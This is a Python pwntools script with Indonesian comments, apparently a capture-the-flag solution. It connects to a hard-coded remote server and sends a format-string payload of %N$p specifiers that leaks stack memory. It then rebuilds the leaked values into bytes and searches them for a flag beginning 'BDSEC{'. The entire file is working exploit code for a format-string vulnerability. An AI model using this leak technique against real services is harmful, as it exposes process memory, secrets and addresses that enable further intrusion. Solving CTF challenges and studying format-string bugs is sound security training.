from pwn import *
import re

# --- Detail Koneksi ---
host = '45.33.118.86'
port = 9992

# --- Fungsi Utama ---
def final_attempt():
    """
    Skrip final dengan parsing yang lebih andal untuk menemukan flag.
    """
    log.info(f"Menghubungkan ke {host}:{port}...")
    try:
        p = remote(host, port)
        p.recvuntil(b"Enter your input: ")
    except PwnlibException as e:
        log.failure(f"Gagal terhubung: {e}")
        return

    # Payload tetap sama, membocorkan jangkauan yang luas
    payload = b""
    for i in range(6, 100):
        payload += b"%" + str(i).encode() + b"$p."
    
    log.info("Mengirim payload...")
    p.sendline(payload)

    p.recvuntil(b"Buzz says: ")
    leak = p.recvline().decode().strip()
    p.close()
    log.success("Berhasil menerima data yang bocor!")

    # --- PERUBAHAN 1: Cetak data mentah untuk debug ---
    log.info(f"Raw leak from server: '{leak}'")

    # --- PERUBAHAN 2: Gunakan regex untuk menemukan semua alamat hex ---
    hex_addresses = re.findall(r'0x([0-9a-fA-F]+)', leak)
    if not hex_addresses:
        log.failure("Tidak ada alamat heksadesimal yang ditemukan dalam data yang bocor.")
        return

    log.info("Memproses data menggunakan regex...")
    reconstructed_memory = b""
    for hex_part in hex_addresses:
        # --- PERUBAHAN 3: Logika konversi yang disederhanakan ---
        try:
            # Pastikan panjang hex genap dengan menambahkan '0' jika perlu
            if len(hex_part) % 2 != 0:
                hex_part = '0' + hex_part
            
            hex_bytes = bytes.fromhex(hex_part)
            reconstructed_memory += hex_bytes[::-1] # Balik untuk little-endian
        except ValueError:
            continue
            
    # Cari pola flag
    try:
        decoded_string = reconstructed_memory.decode('latin-1')
        flag_start = decoded_string.find("BDSEC{")
        if flag_start != -1:
            flag_end = decoded_string.find("}", flag_start)
            if flag_end != -1:
                flag = decoded_string[flag_start : flag_end + 1]
                log.success(f"Flag ditemukan: {flag}")
                return flag
        
        log.failure("Pola flag tidak ditemukan.")
        print("\n--- HASIL DEKODE LENGKAP UNTUK DEBUG ---")
        print(decoded_string)
        print("------------------------------------------")
        return None

    except UnicodeDecodeError:
        log.failure("Gagal mendekode memori yang direkonstruksi.")
        return None

# --- Jalankan Skrip ---
if __name__ == "__main__":
    final_attempt()
